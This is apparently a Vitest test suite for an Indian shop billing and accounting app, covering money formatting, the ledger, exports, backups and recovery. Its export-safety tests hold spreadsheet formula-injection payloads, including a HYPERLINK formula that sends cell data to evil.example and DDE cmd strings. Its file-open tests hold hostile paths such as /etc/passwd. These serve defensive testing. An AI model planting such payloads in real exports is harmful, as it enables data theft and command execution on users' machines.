import { describe, expect, it } from 'vitest';
import { createTestApp, ledgerProblems, systemBalance } from './helpers';
import { postEntry, replaceEntry, voidEntry, partyBalance } from '../src/core/accounting/ledger';
import { nextDocNumber } from '../src/core/numbering';
import { amountInWords, formatINR, lineAmount, parseMoney, roundOffAdjustment, formatQty } from '../src/shared/money';
import { fyOf, presetRange, formatDate } from '../src/shared/dates';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import ExcelJS from 'exceljs';
import JSZip from 'jszip';
import { guardText, reportToCsv, rowsToCsv } from '../src/core/export/csv';
import { drCrFormat, indianPattern, moneyFormat, reportToXlsx } from '../src/core/export/xlsx';
import { renderReceiptHtml } from '../src/core/print/receipt';
import { defaultSettings } from '../src/shared/settings';
import { fieldLabel, friendlyIssueMessage } from '../src/core/api/router';
import { friendlyPrintFailure, printerMissingMessage, TestPlatform } from '../src/core/platform';
import { updateSection } from '../src/core/settings';
import { BillforceApp } from '../src/core/app';
import { backupFolderFromDamagedFile, describeOpenFailure, findBackups, RecoveryError, restoreDamagedDatabase } from '../src/core/recovery';
import { createBackup } from '../src/core/modules/data/backup';
import { confirmLeave, hasUnsavedChanges, isScreenLocked, registerDirtyForm, setLeaveConfirmer, setScreenLocked } from '../src/renderer/guards';

describe('money & dates', () => {
  it('formats rupees the Indian way', () => {
    expect(formatINR(12345650)).toBe('₹1,23,456.50');
    expect(formatINR(1234567890)).toBe('₹1,23,45,678.90');
    expect(formatINR(-50000)).toBe('-₹500.00');
    expect(formatINR(99)).toBe('₹0.99');
    expect(formatINR(0)).toBe('₹0.00');
  });
  it('parses user input', () => {
    expect(parseMoney('₹1,23,456.50')).toBe(12345650);
    expect(parseMoney('10.005')).toBe(1001);
    expect(parseMoney('1.5k')).toBe(150000);
    expect(parseMoney('abc')).toBeNull();
    expect(parseMoney('')).toBeNull();
  });
  it('computes line amounts and round off exactly', () => {
    expect(lineAmount(1.5, 4550)).toBe(6825);
    expect(lineAmount(0.1, 4500)).toBe(450);
    expect(lineAmount(3, 3333)).toBe(9999);
    expect(roundOffAdjustment(12345)).toBe(-45);
    expect(roundOffAdjustment(12350)).toBe(50);
    expect(formatQty(2.5)).toBe('2.5');
    expect(formatQty(1000)).toBe('1,000');
  });
  it('writes amounts in words (lakh / crore)', () => {
    expect(amountInWords(12345650)).toBe('Rupees One Lakh Twenty Three Thousand Four Hundred Fifty Six and Fifty Paise Only');
    expect(amountInWords(100)).toBe('Rupees One Only');
  });
  it('knows the Indian financial year', () => {
    expect(fyOf('2026-09-28')).toMatchObject({ name: '2026-27', start: '2026-04-01', end: '2027-03-31', short: '26-27' });
    expect(fyOf('2027-03-31').name).toBe('2026-27');
    expect(fyOf('2027-04-01').name).toBe('2027-28');
    expect(presetRange('this_fy', '2026-09-28')).toEqual({ from: '2026-04-01', to: '2026-09-28' });
    expect(presetRange('last_fy', '2026-09-28')).toEqual({ from: '2025-04-01', to: '2026-03-31' });
    expect(presetRange('this_quarter', '2026-09-28')).toEqual({ from: '2026-07-01', to: '2026-09-28' });
    expect(presetRange('this_quarter', '2027-02-10')).toEqual({ from: '2027-01-01', to: '2027-02-10' });
    expect(formatDate('2026-09-28')).toBe('28-09-2026');
  });
});

describe('setup & login', () => {
  it('sets up the business and logs the owner in', async () => {
    const t = await createTestApp({ openingCash: 1000000 });
    const status = await t.call('app.status');
    expect(status.setupDone).toBe(true);
    expect(status.businessName).toBe('Sharma General Store');
    expect(status.session?.role).toBe('owner');
    expect(systemBalance(t.app, 'CASH')).toBe(1000000);
    expect(systemBalance(t.app, 'OPENING_EQUITY')).toBe(-1000000);
    expect(ledgerProblems(t.app)).toEqual([]);
  });

  it('rejects wrong passwords and locks after 5 attempts', async () => {
    const t = await createTestApp();
    await t.call('auth.logout');
    for (let i = 0; i < 4; i++) expect((await t.fails('auth.login', { username: 'owner', password: 'x' })).message).toMatch(/Wrong/);
    expect((await t.fails('auth.login', { username: 'owner', password: 'x' })).message).toMatch(/wait/);
    expect((await t.fails('auth.login', { username: 'owner', password: 'owner-pass' })).message).toMatch(/wait/);
    const failed = t.app.db.value<number>("SELECT COUNT(*) FROM activity_log WHERE action = 'user.login_failed'");
    expect(failed).toBe(5);
  });

  it('protects routes by login and permission', async () => {
    const t = await createTestApp();
    await t.call('auth.logout');
    expect((await t.fails('auth.changePassword', { currentPassword: 'a', newPassword: 'bbbb' })).code).toBe('UNAUTHENTICATED');
    await t.loginAs('cashier');
    const me = await t.call('auth.me');
    expect(me?.role).toBe('cashier');
    expect(me?.permissions).toContain('billing.create');
    expect(me?.permissions).not.toContain('reports.financial');
  });

  it('recovers the owner password with the recovery code', async () => {
    const t = await createTestApp();
    const users = t.app.db.all('SELECT * FROM users');
    expect(users).toHaveLength(1);
    await t.call('auth.logout');
    expect((await t.fails('auth.recover', { recoveryCode: 'AAAA-BBBB-CCCC-DDDD', newPassword: 'newpass' })).code).toBe('VALIDATION');
  });
});

describe('ledger engine', () => {
  it('posts balanced entries and rejects unbalanced ones', async () => {
    const t = await createTestApp();
    const ctx = t.app.ctx();
    const id = postEntry(ctx, {
      date: '2026-09-28',
      voucherType: 'capital',
      narration: 'Capital introduced',
      lines: [
        { account: 'CASH', debit: 50000 },
        { account: 'CAPITAL', credit: 50000 },
      ],
    });
    expect(id).toBeGreaterThan(0);
    expect(() =>
      postEntry(ctx, { date: '2026-09-28', voucherType: 'journal', lines: [{ account: 'CASH', debit: 100 }, { account: 'CAPITAL', credit: 99 }] }),
    ).toThrow(/must be equal/);
    expect(() =>
      postEntry(ctx, { date: '2026-09-28', voucherType: 'journal', lines: [{ account: 'AR', debit: 100 }, { account: 'SALES', credit: 100 }] }),
    ).toThrow(/Choose a customer/);
    expect(() =>
      postEntry(ctx, { date: '2026-03-31', voucherType: 'journal', lines: [{ account: 'CASH', debit: 100 }, { account: 'CAPITAL', credit: 100 }] }),
    ).toThrow(/before your books start/);
    expect(ledgerProblems(t.app)).toEqual([]);
  });

  it('replaces and voids entries; void entries do not count', async () => {
    const t = await createTestApp();
    const ctx = t.app.ctx();
    const cust = t.app.db.insert('customers', { name: 'Anita', created_at: '2026-09-28 10:00:00' });
    const id = postEntry(ctx, {
      date: '2026-09-28',
      voucherType: 'sale',
      lines: [
        { account: 'AR', debit: 1000, partyType: 'customer', partyId: cust },
        { account: 'SALES', credit: 1000 },
      ],
    });
    expect(partyBalance(ctx, 'customer', cust)).toBe(1000);
    replaceEntry(ctx, id, {
      date: '2026-09-28',
      voucherType: 'sale',
      lines: [
        { account: 'AR', debit: 1500, partyType: 'customer', partyId: cust },
        { account: 'SALES', credit: 1500 },
      ],
    });
    expect(partyBalance(ctx, 'customer', cust)).toBe(1500);
    voidEntry(ctx, id, 'cancelled');
    expect(partyBalance(ctx, 'customer', cust)).toBe(0);
    expect(systemBalance(t.app, 'SALES')).toBe(0);
    expect(ledgerProblems(t.app)).toEqual([]);
  });

  it('refuses entries in a closed financial year', async () => {
    const t = await createTestApp({ booksStart: '2025-04-01' });
    const ctx = t.app.ctx();
    postEntry(ctx, { date: '2025-06-01', voucherType: 'capital', lines: [{ account: 'CASH', debit: 100 }, { account: 'CAPITAL', credit: 100 }] });
    t.app.db.run("UPDATE financial_years SET is_closed = 1 WHERE name = '2025-26'");
    expect(() =>
      postEntry(ctx, { date: '2025-06-02', voucherType: 'capital', lines: [{ account: 'CASH', debit: 100 }, { account: 'CAPITAL', credit: 100 }] }),
    ).toThrow(/2025-26 is closed/);
  });

  it('numbers documents per financial year', async () => {
    const t = await createTestApp({ booksStart: '2026-04-01' });
    const ctx = t.app.ctx();
    expect(nextDocNumber(ctx, 'bill', '2026-09-28').number).toBe('INV/26-27/0001');
    expect(nextDocNumber(ctx, 'bill', '2026-09-28').number).toBe('INV/26-27/0002');
    expect(nextDocNumber(ctx, 'bill', '2027-04-01').number).toBe('INV/27-28/0001');
  });

  it('rolls back everything when a mutation fails', async () => {
    const t = await createTestApp();
    const before = t.app.db.value<number>('SELECT COUNT(*) FROM journal_entries');
    expect(() =>
      t.app.db.tx(() => {
        postEntry(t.app.ctx(), { date: '2026-09-28', voucherType: 'capital', lines: [{ account: 'CASH', debit: 100 }, { account: 'CAPITAL', credit: 100 }] });
        throw new Error('boom');
      }),
    ).toThrow('boom');
    expect(t.app.db.value<number>('SELECT COUNT(*) FROM journal_entries')).toBe(before);
  });
});

describe('exports & receipts', () => {
  const report = {
    title: 'Test Report',
    subtitle: '01-04-2026 to 28-09-2026',
    columns: [
      { key: 'name', label: 'Name' },
      { key: 'amt', label: 'Amount', type: 'money' as const },
      { key: 'bal', label: 'Balance', type: 'drcr' as const },
    ],
    rows: [
      { cells: { name: 'Sugar, 1 kg', amt: 12345650, bal: -500 } },
      { cells: { name: 'Total', amt: 12345650, bal: -500 }, style: 'total' as const },
    ],
  };
  it('exports CSV with BOM and plain numbers', () => {
    const csv = reportToCsv(report);
    expect(csv.startsWith('﻿')).toBe(true);
    expect(csv).toContain('"Sugar, 1 kg",123456.50,5.00 Cr');
  });
  it('exports a real xlsx file', async () => {
    const buf = await reportToXlsx(report, 'Sharma General Store');
    expect(buf[0]).toBe(0x50); // "PK" zip signature
    expect(buf[1]).toBe(0x4b);
  });
  it('renders an 80mm receipt with QR', () => {
    const s = defaultSettings('2026-09-28');
    const html = renderReceiptHtml(
      {
        title: 'BILL',
        meta: [['Bill No', 'INV/26-27/0001']],
        items: [{ name: 'Tea <special>', qty: '2', rate: '15.00', amount: '30.00' }],
        totals: [{ label: 'TOTAL', value: '₹30.00', big: true }],
        qr: { data: 'upi://pay?pa=shop@upi&am=30.00', caption: 'Scan to pay' },
      },
      { ...s.business, name: 'Sharma General Store' },
      s.receipt,
    );
    expect(html).toContain('size: 80mm auto');
    expect(html).toContain('Tea &lt;special&gt;');
    expect(html).toContain('<svg');
  });
});

describe('backups', () => {
  it('creates a compressed backup that can be extracted and opened', async () => {
    const { createBackup, extractBackup } = await import('../src/core/modules/data/backup');
    const { BillforceApp } = await import('../src/core/app');
    const fs = await import('node:fs');
    const os = await import('node:os');
    const path = await import('node:path');
    const t = await createTestApp({ openingCash: 12345 });
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bf-backup-'));
    const ctx = t.app.ctx();
    const info = createBackup(ctx, 'manual', { targetPath: path.join(dir, 'test.bfbackup') });
    expect(info.sizeBytes).toBeGreaterThan(100);
    const raw = extractBackup(info.path, dir);
    const db = BillforceApp.openDatabase(raw, new Date());
    expect(db.value<number>('SELECT COUNT(*) FROM users')).toBe(1);
    db.close();
    expect(t.app.db.value<number>('SELECT COUNT(*) FROM backup_history')).toBe(1);
    expect(() => t.app.db.tx(() => createBackup(t.app.ctx(), 'manual', { targetPath: path.join(dir, 'x.bfbackup') }))).toThrow(/transaction/);
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('negative balance warning', () => {
  it('warns when a payment takes cash below zero', async () => {
    const { negativeBalanceWarning, systemAccountId } = await import('../src/core/accounting/ledger');
    const t = await createTestApp({ openingCash: 50000 });
    const ctx = t.app.ctx();
    const cash = systemAccountId(ctx, 'CASH');
    expect(negativeBalanceWarning(ctx, cash, 40000, '2026-09-28')).toBeNull();
    expect(negativeBalanceWarning(ctx, cash, 60000, '2026-09-28')).toMatch(/short by ₹100\.00/);
    expect(negativeBalanceWarning(ctx, systemAccountId(ctx, 'SALES'), 60000, '2026-09-28')).toBeNull();
  });
});

describe('friendly validation messages', () => {
  it('turns field names into labels', () => {
    expect(fieldLabel('itemName')).toBe('Item name');
    expect(fieldLabel('customerId')).toBe('Customer');
    expect(fieldLabel('billDiscountPct')).toBe('Bill discount percent');
    expect(fieldLabel('upiId')).toBe('UPI');
    expect(fieldLabel('qty')).toBe('Quantity');
  });

  it('explains zod checks in plain English', () => {
    expect(friendlyIssueMessage({ code: 'too_big', origin: 'string', maximum: 120, path: ['name'] })).toBe('Name is too long (max 120 characters)');
    expect(friendlyIssueMessage({ code: 'too_small', origin: 'string', minimum: 1, path: ['name'] })).toBe('Name is required');
    expect(friendlyIssueMessage({ code: 'too_small', origin: 'number', minimum: 0, inclusive: false, path: ['items', 0, 'qty'] })).toBe('Quantity must be more than zero');
    expect(friendlyIssueMessage({ code: 'too_small', origin: 'array', minimum: 1, path: ['items'] })).toBe('Add at least one item');
    expect(friendlyIssueMessage({ code: 'invalid_type', expected: 'string', input: undefined, path: ['phone'] })).toBe('Phone is required');
    expect(friendlyIssueMessage({ code: 'invalid_type', expected: 'number', input: 'abc', path: ['rate'] })).toBe('Rate must be a number');
    expect(friendlyIssueMessage({ code: 'invalid_value', path: ['mode'] })).toBe('Choose a valid mode');
    expect(friendlyIssueMessage({ code: 'invalid_format', format: 'email', path: ['email'] })).toBe('Enter a valid email address');
  });

  it('never shows zod wording or field paths to the user', async () => {
    const t = await createTestApp();
    const longName = 'Special hand-made festival gift hamper with dry fruits, sweets, candles and a greeting card for Diwali 2026 - large size, blue box';
    expect(longName.length).toBeGreaterThan(120);
    const e1 = await t.fails('sales.create', { items: [{ itemName: longName, qty: 1, rate: 1500 }], payments: [{ mode: 'cash', amount: 1500 }] });
    expect(e1.code).toBe('VALIDATION');
    expect(e1.message).toBe('Line 1: Item name is too long (max 120 characters)');
    expect(e1.fields?.['items.0.itemName']).toBe('Item name is too long (max 120 characters)');

    // A schema without its own message gets the same kind of text instead of "Too big: expected string to have <=120 characters".
    const e2 = await t.fails('items.create', { name: longName, rate: 100 });
    expect(e2.message).toBe('Name is too long (max 120 characters)');
    const e3 = await t.fails('customers.quickCreate', {});
    expect(e3.message).toBe('Name is required');
    for (const e of [e1, e2, e3]) expect(e.message).not.toMatch(/Too big|Too small|Invalid input|expected|items\.0|Please check/);
  });
});

describe('exports are safe and Indian-formatted', () => {
  const report = {
    title: '=Customers outstanding',
    subtitle: 'As on 28-09-2026',
    columns: [
      { key: 'name', label: 'Customer' },
      { key: 'due', label: 'Due', type: 'money' as const },
      { key: 'bal', label: 'Balance', type: 'drcr' as const },
    ],
    rows: [
      { cells: { name: '=HYPERLINK("http://evil.example/?d="&B5,"Click")', due: 1000, bal: 1000 } },
      { cells: { name: "=cmd|' /C calc'!A0", due: -15000000, bal: -25000000 } },
      { cells: { name: "+SUM(1+1)*cmd|' /C notepad'!A0", due: 0, bal: 13360050 } },
      { cells: { name: '-2+3', due: 500, bal: 0 } },
      { cells: { name: '@SUM(A1)', due: 500, bal: 0 } },
      { cells: { name: '\tTab first', due: 500, bal: 0 } },
      { cells: { name: 'Anita - Kothrud', due: 500, bal: 0 } },
    ],
    summary: [
      { label: 'Closing balance', value: -80000, type: 'drcr' as const },
      { label: 'Owed to you', value: 12000050, type: 'drcr' as const },
      { label: 'Total due', value: -15000000, type: 'money' as const },
      { label: 'Note', value: '=1+1' },
    ],
    notes: ['+ means added'],
  };

  it('guards CSV text cells against formulas but never touches numbers', () => {
    expect(guardText('=1+1')).toBe("'=1+1");
    expect(guardText('Sugar')).toBe('Sugar');
    expect(guardText('-')).toBe('-');
    const csv = reportToCsv(report);
    const lines = csv.slice(1).split('\r\n');
    expect(lines[0]).toBe("'=Customers outstanding");
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.example/?d=""&B5,""Click"")",10.00,10.00 Dr');
    expect(csv).toContain("'=cmd|' /C calc'!A0,-150000.00,250000.00 Cr");
    expect(csv).toContain("'+SUM(1+1)*cmd|' /C notepad'!A0,0.00,133600.50 Dr");
    expect(csv).toContain("'-2+3,5.00,0.00");
    expect(csv).toContain("'@SUM(A1),5.00");
    expect(csv).toContain("'\tTab first,5.00");
    expect(csv).toContain('Anita - Kothrud,5.00');
    expect(csv).toContain("'+ means added");
    // No text field may start with a formula character (negative numbers are numbers).
    for (const line of lines) expect(line).not.toMatch(/(^|,)"?([=+@\t]|-(?!\d))/);
    // Dr/Cr summary figures read like the rows (not "-800.00").
    expect(csv).toContain('Closing balance,800.00 Cr');
    expect(csv).toContain('Owed to you,120000.50 Dr');
    expect(csv).toContain('Total due,-150000.00');
    expect(csv).toContain("Note,'=1+1");
    const tpl = rowsToCsv(['Name', 'Rate'], [['=evil()', 12.5], ['Tea', -3]]);
    expect(tpl).toContain("'=evil(),12.5");
    expect(tpl).toContain('Tea,-3');
  });

  it('chooses Indian grouping per cell for money and Dr/Cr, negatives included', () => {
    expect(indianPattern(99999.99)).toBe('#,##0.00');
    expect(indianPattern(-150000)).toBe('##\\,##\\,##0.00');
    expect(indianPattern(-25000000)).toBe('##\\,##\\,##\\,##0.00');
    expect(indianPattern(1234567890)).toBe('##\\,##\\,##\\,##\\,##0.00');
    expect(indianPattern(99999.999)).toBe('##\\,##\\,##0.00');
    expect(moneyFormat(-150000)).toBe('##\\,##\\,##0.00;-##\\,##\\,##0.00;0.00');
    expect(drCrFormat(304481.68)).toBe('##\\,##\\,##0.00 "Dr";##\\,##\\,##0.00 "Cr";0.00');
  });

  it('writes xlsx text as text and amounts with Indian formats', async () => {
    const buf = await reportToXlsx(report, 'Sharma General Store');
    // The formats as Excel reads them (exceljs drops the backslashes when loading, so check the raw file too).
    const styles = await (await JSZip.loadAsync(buf)).file('xl/styles.xml')!.async('string');
    for (const f of [moneyFormat(-150000), drCrFormat(-250000), drCrFormat(-800)]) expect(styles).toContain(`formatCode="${f.replace(/"/g, '&quot;')}"`);
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(buf as any);
    const ws = wb.worksheets[0];
    const cells: ExcelJS.Cell[] = [];
    ws.eachRow((row) => row.eachCell((c) => cells.push(c)));
    const find = (v: unknown) => cells.find((c) => c.value === v)!;
    const loaded = (f: string) => f.replace(/\\,/g, ',');
    const evil = find("=cmd|' /C calc'!A0");
    expect(evil.type).toBe(ExcelJS.ValueType.String);
    expect(cells.some((c) => c.type === ExcelJS.ValueType.Formula)).toBe(false);
    expect(find(-150000).numFmt).toBe(loaded(moneyFormat(-150000)));
    expect(find(-250000).numFmt).toBe(loaded(drCrFormat(-250000)));
    expect(find(133600.5).numFmt).toBe('##,##,##0.00 "Dr";##,##,##0.00 "Cr";0.00');
    expect(find(-800).numFmt).toBe('#,##0.00 "Dr";#,##0.00 "Cr";0.00');
    expect(find(120000.5).numFmt).toBe(loaded(drCrFormat(120000.5)));
  });
});

describe('files.open only opens what Billforce saved', () => {
  it('refuses any other path, for every role', async () => {
    const t = await createTestApp();
    for (const p of ['/etc/passwd', 'C:\\Windows\\System32\\calc.exe', '\\\\evil-server\\share\\run.bat', 'relative/file.csv', '/tmp/billforce-test-docs/other.xlsx']) {
      expect((await t.fails('files.open', { path: p })).code).toBe('FORBIDDEN');
      expect((await t.fails('files.showInFolder', { path: p })).code).toBe('FORBIDDEN');
    }
    await t.loginAs('cashier');
    expect((await t.fails('files.open', { path: '/etc/passwd' })).code).toBe('FORBIDDEN');
  });

  it('opens exports saved this session, the data folder and backups', async () => {
    const t = await createTestApp();
    const report = { title: 'Test', columns: [{ key: 'a', label: 'A' }], rows: [{ cells: { a: 'x' } }] };
    const { path: saved } = await t.call('files.exportReport', { report, format: 'csv' });
    expect(saved).toBeTruthy();
    await t.call('files.open', { path: saved! });
    await t.call('files.showInFolder', { path: saved! });
    await t.call('files.open', { path: t.app.info.dataDir });
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bf-open-'));
    const b = createBackup(t.app.ctx(), 'manual', { targetPath: path.join(dir, 'Shop_manual_20260928_100000.bfbackup') });
    await t.call('files.showInFolder', { path: b.path });
    expect((await t.fails('files.open', { path: path.join(dir, 'other.exe') })).code).toBe('FORBIDDEN');
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('receipt printer checks', () => {
  it('says so in plain English when the chosen printer is not installed', async () => {
    const t = await createTestApp();
    updateSection(t.app.ctx(), 'receipt', { printerName: 'POS-80 (old)' });
    const bill = await t.call('sales.create', { items: [{ itemName: 'Pen', qty: 1, rate: 1000 }], payments: [{ mode: 'cash', amount: 1000 }] });
    const r = await t.call('sales.print', { id: bill.id });
    expect(r).toMatchObject({ printed: false, message: "Printer 'POS-80 (old)' was not found. Choose your printer again in Settings > Receipt & printer." });
    expect(t.platform.printed).toHaveLength(0);
    updateSection(t.app.ctx(), 'receipt', { printerName: 'pos-80' });
    expect(await t.call('sales.print', { id: bill.id })).toMatchObject({ printed: true });
  });

  it('translates Chromium print errors', () => {
    expect(friendlyPrintFailure('Invalid deviceName provided', 'POS-80')).toBe(printerMissingMessage('POS-80'));
    expect(friendlyPrintFailure('Print job failed', 'POS-80')).toMatch(/did not print\. Check that it is switched on/);
    expect(friendlyPrintFailure('Print job canceled')).toBe('Printing was cancelled');
    expect(friendlyPrintFailure(undefined)).toBeUndefined();
  });

  it('passes the real print failure message through when it is already readable', async () => {
    const t = await createTestApp();
    updateSection(t.app.ctx(), 'receipt', { printerName: 'POS-80' });
    const bill = await t.call('sales.create', { items: [{ itemName: 'Pen', qty: 1, rate: 1000 }], payments: [{ mode: 'cash', amount: 1000 }] });
    t.platform.printHtml = async () => ({ printed: false, message: 'Invalid deviceName provided' });
    expect(await t.call('sales.print', { id: bill.id })).toMatchObject({ printed: false, message: printerMissingMessage('POS-80') });
  });
});

describe('start-up recovery when the database cannot be opened', () => {
  async function makeShop(dir: string) {
    const app = new BillforceApp({ dataDir: dir, platform: new TestPlatform(dir), version: 'test', clock: () => new Date('2026-09-28T10:00:00') });
    const r = await app.invoke('setup.complete', {
      business: { name: 'Sharma General Store' },
      owner: { fullName: 'Ravi Sharma', username: 'owner', password: 'owner-pass' },
      booksStartDate: '2026-04-01',
      openingCash: 5000,
    });
    expect(r.ok).toBe(true);
    return app;
  }

  it('restores a .bfbackup over a damaged billforce.db and keeps the damaged file', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bf-recover-'));
    const dbPath = path.join(dir, 'billforce.db');
    const app = await makeShop(dir);
    const backupDir = path.join(dir, 'Billforce Backups');
    const older = createBackup(app.ctx(), 'auto', { targetPath: path.join(backupDir, 'Sharma-General-Store_auto_20260927_210000.bfbackup') });
    const newest = createBackup(app.ctx(), 'manual', { targetPath: path.join(backupDir, 'Sharma-General-Store_manual_20260928_093000.bfbackup') });
    app.close();
    expect(findBackups(backupDir).map((b) => b.path)).toEqual([newest.path, older.path]);

    // Power cut: the file is garbage now, and a stale WAL is lying next to it.
    fs.writeFileSync(dbPath, Buffer.alloc(8192, 7));
    fs.writeFileSync(`${dbPath}-wal`, Buffer.alloc(4096, 3));
    let openError: unknown;
    try {
      new BillforceApp({ dataDir: dir, platform: new TestPlatform(dir), version: 'test' });
    } catch (e) {
      openError = e;
    }
    expect(openError).toBeTruthy();
    const failure = describeOpenFailure(openError);
    expect(failure).toMatchObject({ kind: 'damaged', canRestore: true });
    expect(failure.detail).toMatch(/\.bfbackup/);
    expect(backupFolderFromDamagedFile(dbPath)).toBeNull();

    // A file that is not a backup changes nothing.
    const junk = path.join(dir, 'notes.bfbackup');
    fs.writeFileSync(junk, 'hello');
    expect(() => restoreDamagedDatabase(dbPath, junk)).toThrow(RecoveryError);
    expect(() => restoreDamagedDatabase(dbPath, junk)).toThrow(/not a Billforce backup/);
    expect(fs.readFileSync(dbPath)[0]).toBe(7);

    const r = restoreDamagedDatabase(dbPath, newest.path, new Date('2026-09-28T11:15:00'));
    expect(r.businessName).toBe('Sharma General Store');
    expect(r.damagedCopy).toBe(path.join(dir, 'billforce-damaged-20260928-111500.db'));
    expect(fs.readFileSync(r.damagedCopy!)[0]).toBe(7);
    expect(fs.existsSync(`${r.damagedCopy}-wal`)).toBe(true);
    expect(fs.existsSync(`${dbPath}-wal`)).toBe(false);

    const reopened = new BillforceApp({ dataDir: dir, platform: new TestPlatform(dir), version: 'test' });
    const status = await reopened.invoke('app.status');
    expect(status.ok && (status.data as any).businessName).toBe('Sharma General Store');
    const login = await reopened.invoke('auth.login', { username: 'owner', password: 'owner-pass' });
    expect(login.ok).toBe(true);
    reopened.close();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('explains a data file from a newer version and does not offer a restore', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bf-newer-'));
    const app = await makeShop(dir);
    updateSection(app.ctx(), 'backup', { folder: path.join(dir, 'Pen drive backups') });
    app.db.exec('PRAGMA user_version = 99');
    app.close();
    // The folder chosen in Settings can still be read from a file that does not open normally.
    expect(backupFolderFromDamagedFile(path.join(dir, 'billforce.db'))).toBe(path.join(dir, 'Pen drive backups'));
    let openError: unknown;
    try {
      new BillforceApp({ dataDir: dir, platform: new TestPlatform(dir), version: 'test' });
    } catch (e) {
      openError = e;
    }
    const failure = describeOpenFailure(openError);
    expect(failure).toMatchObject({ kind: 'newer-version', canRestore: false });
    expect(failure.title).toMatch(/newer version of Billforce/);
    expect(failure.detail).toMatch(/Install the latest version/);
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('UI guards (lock screen, unsaved changes)', () => {
  it('keeps a registry of forms with unsaved changes and asks before leaving', async () => {
    expect(hasUnsavedChanges()).toBe(false);
    expect(await confirmLeave()).toBe(true);
    const asked: string[] = [];
    setLeaveConfirmer(async () => (asked.push('leave?'), false));
    const a = registerDirtyForm();
    const b = registerDirtyForm();
    expect(hasUnsavedChanges()).toBe(true);
    expect(await confirmLeave()).toBe(false);
    a();
    expect(hasUnsavedChanges()).toBe(true);
    setLeaveConfirmer(async () => true);
    expect(await confirmLeave()).toBe(true);
    b();
    expect(hasUnsavedChanges()).toBe(false);
    expect(asked).toEqual(['leave?']);
    setLeaveConfirmer(null);
  });

  it('holds the screen-lock flag that hotkeys and dialogs check', () => {
    expect(isScreenLocked()).toBe(false);
    setScreenLocked(true);
    expect(isScreenLocked()).toBe(true);
    setScreenLocked(false);
    expect(isScreenLocked()).toBe(false);
  });
});
